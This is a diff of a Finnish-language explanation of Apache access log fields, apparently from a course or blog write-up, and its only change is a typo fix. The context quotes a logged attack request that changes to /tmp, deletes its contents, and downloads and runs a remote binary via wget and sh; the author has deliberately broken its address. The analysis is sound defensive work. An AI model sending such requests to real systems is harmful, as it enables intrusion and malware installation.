@@ -139,7 +139,7 @@ Tietue | Selitys
 \- | HTTP tunnistautumisen ilmoittama käyttäjätunniste, joka tässä tapauksessa myös tyhjä.  
 [14/Feb/2022:10:12:48 +0000] | Päivämäärä, kellonaika ja aikavyöhyke +-UTF muodossa. Tässä UTF +0 eli ajat ovat kaksi tuntia jäljessä Suomen aikaan verrattuna.  
 "GET /shell?cd+/tmp;rm+-rf+*;wget+ http;//23,94,7,175/,s4y/arm;sh+/tmp/arm" (http linkki rikottu minun toimestani) | Hyökkääjä pyytää (GET) resurssia ja antaa parametreiksi koodin pätkän. Tällä koodilla hän yrittää avata shell istunnon, navigoida root sijainnin väliaikaistiedostoihin (cd /tmp), poistaa koko tmp kansion sisällön alikansioineen (rm -rf *), ja ladata verkosta kansioon oman ohjelmansa wget -komennolla. Lopuksi hän pyrkii suorittamaan kyseisen ohjelman sh komennolla.   
-400 | Statuskoodi, jonka palvelin ilmoitti takaisin käyttäjälle.  [400 Bad Request](https://en.wikipedia.org/wiki/HTTP_400) eli esitetty pyynnössä oli jotain vikaa.
+400 | Statuskoodi, jonka palvelin ilmoitti takaisin käyttäjälle.  [400 Bad Request](https://en.wikipedia.org/wiki/HTTP_400) eli esitetyssä pyynnössä oli jotain vikaa.
 477 | Käyttäjälle palautetun tiedoston koko tavuina.  
 \-| Referoija eli miltä sivulta pyyntö tuli.  
 \- | Järjestelmä ja selaintiedot jotka käyttäjän selain ilmoitti.  
